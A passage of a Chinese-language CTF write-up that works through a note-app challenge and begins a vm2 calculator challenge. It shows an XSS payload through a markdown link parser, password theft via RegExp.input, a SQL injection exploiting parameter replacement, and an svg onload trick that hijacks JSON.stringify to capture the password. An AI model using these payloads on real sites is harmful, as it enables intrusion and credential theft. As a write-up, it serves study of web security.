      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[([^\]]+)\]\(([^\)]+)\)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">#\s*([^\n]+)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\*\*([^\n]+)\*\*</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/strong></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\*([^\n]+)\*</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;em></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/em></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> views<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>parse Makrdown 那一段就一臉可以 XSS 的樣子：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[([^\]]+)\]\(([^\)]+)\)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>事後作者說他本來沒有想要在這邊留洞，這個洞是 GitHub copilot 寫出來的XD 但他覺得很有趣就留下來了。</p>
<p>這個 XSS 的洞並不難找</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> text <span class="token operator">=</span> <span class="token string">'[abc](123" onfocus=alert`1` autofocus=")'</span>
text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[([^\]]+)\]\(([^\)]+)\)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>
<span class="token comment">// &lt;a href="123" onfocus=alert`1` autofocus="">abc&lt;/a></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但問題是有了 XSS 之後，該怎麼把密碼偷出來（密碼就是這題的 flag）？</p>
<p>我當時怎麼看都不覺得可以偷到密碼，賽後看 writeup 才知道一個神奇的屬性：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input">RegExp.input</a>，這個屬性可以拿到 RegExp 最後一次的 input，例如說這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">a</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'secret password'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>RegExp<span class="token punctuation">.</span>input<span class="token punctuation">)</span> <span class="token comment">// secret password</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>而 password 就是最後一次丟去 <code>/^[^$&#39;]+$/.test()</code> 的輸入，所以就可以藉此拿到 password，這真的是 mind-blowing。</p>
<p>但這邊還有個細節，那就是如果你用了 markdown XSS，最後配對的 regexp 就不是 password 了，所以就拿不到。這時候你必須找出 server 的 SQL injection，程式碼如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> db <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token function-variable function">prepare</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">query<span class="token punctuation">,</span> params</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">)</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> clean <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">['$]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        query <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>clean<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> query<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">query<span class="token punctuation">,</span> params</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> prepared <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> database<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>prepared<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token function-variable function">run</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">query<span class="token punctuation">,</span> params</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> prepared <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> database<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>prepared<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  id<span class="token punctuation">,</span>
  username<span class="token punctuation">,</span>
  <span class="token literal-property property">note</span><span class="token operator">:</span> note<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;>]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  mode<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>會把所有單引號跟 $ 拿掉，然後去 replace 所有的 <code>:param</code>，這時候可以利用這個特性來注入，例如說這樣 (from DrBrix)：</p>
<pre class="line-numbers language-none"><code class="language-none">&quot;username&quot;: &quot;a :note&quot;,
&quot;password&quot;: &quot;pass&quot;
&quot;note&quot;: &quot;, :mode, 0, 0) -- &quot;,
&quot;mode&quot;: &quot;actual note and xss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我們來看一下最後會變怎樣：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// 一開始是</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span>:id<span class="token punctuation">,</span> :username<span class="token punctuation">,</span> :note<span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// 接著假設 id 是 123，就會變成</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span> :username<span class="token punctuation">,</span> :note<span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// 再來 replace username，變成</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'a :note'</span><span class="token punctuation">,</span> :note<span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// 再來是 note，要注意的是兩個 note 都會被 replace</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'a '</span><span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">-- '', ', :mode, 0, 0) -- ', :mode, 0)</span>

<span class="token comment">// 最後是 mode，這時候我們已經可以控制 note 內容的值了，沒有任何限制</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'a '</span><span class="token punctuation">,</span> <span class="token string">'payload'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">-- '', ', 'payload', 0, 0) -- ', :mode, 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用這個洞，就可以不依靠 markdown 來做 XSS，再利用 <code>RegExp.input</code> 這個神奇屬性拿到 password。</p>
<h3><span id="預期外解法">預期外解法</span></h3><p>這題的預期外解法也是超帥，不需要 <code>RegExp.input</code> 了，利用的特性是底下這段程式碼：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> views<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>這段程式碼你可能會預期插入 HTML 之後，會先繼續往下執行，然後才執行 HTML 裡面的內容，例如說：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>y</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    x<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;img src=x onerror=alert(window.y.innerText)>'</span>
    y<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'updated'</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>顯示出來的 alert 會是 <code>updated</code>，img 的事件確實是後來才執行，但如果是這樣寫的話就不一樣了：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>y</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    x<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;svg>&lt;svg onload=alert(window.y.innerText)>'</span>
    y<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'updated'</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這樣寫的話，<code>onload</code> 裡的東西會在 <code>y.innerText = &#39;updated&#39;</code> 之前執行，所以 alert 的內容會是 <code>hello</code>，這個 payload 其實也有記在 <a target="_blank" rel="noopener" href="https://github.com/terjanq/Tiny-XSS-Payloads">tinyXSS</a> 裡面：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>&lt;svg/onload=eval(name)><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>那知道這個之後可以幹嘛呢？</p>
<p>我們先整理一下載入筆記的程式碼，簡化後長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> note<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> views <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      username<span class="token punctuation">,</span>
      password<span class="token punctuation">,</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
  <span class="token comment">// 在底下這行執行之前，會先執行我們的 XSS payload</span>
  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> views<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>現在如果我們可以在最後一行之前執行程式碼的話，就可以做一些有趣的事情。</p>
<p>我們可以先把 <code>document.querySelector</code> 蓋掉，再把 <code>JSON.stringify</code> 蓋掉，像是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function-variable function">querySelector</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function-variable function">stringify</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>蓋掉之後可以幹嘛呢？蓋掉之後我們就可以用 <code>arguments.callee.caller</code>，存取到最外層那個匿名的 async 函式，然後再呼叫一次！再呼叫一次之後，就會再發送一次 request，然後透過 <code>JSON.stringify</code> 把 password 傳進去，這時我們就可以攔截到：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function-variable function">querySelector</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function-variable function">stringify</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token comment">// flag</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這個非預期解來自於 <a target="_blank" rel="noopener" href="https://twitter.com/dr_brix">@dr_brix</a>，真的超級帥，從沒想過可以這樣做。</p>
<h2><span id="webx2fvm-calc2-solves">web&#x2F;vm-calc(2 solves)</span></h2><p>話說做個計算功能是 CTF 中常見的題型，以這題來說乍看之下會以為是 VM escape，核心程式碼如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> NodeVM <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NodeVM</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">eval</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">wasm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">wrapper</span><span class="token operator">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">strict</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> calc <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>calc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> result<span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">return </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>calc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
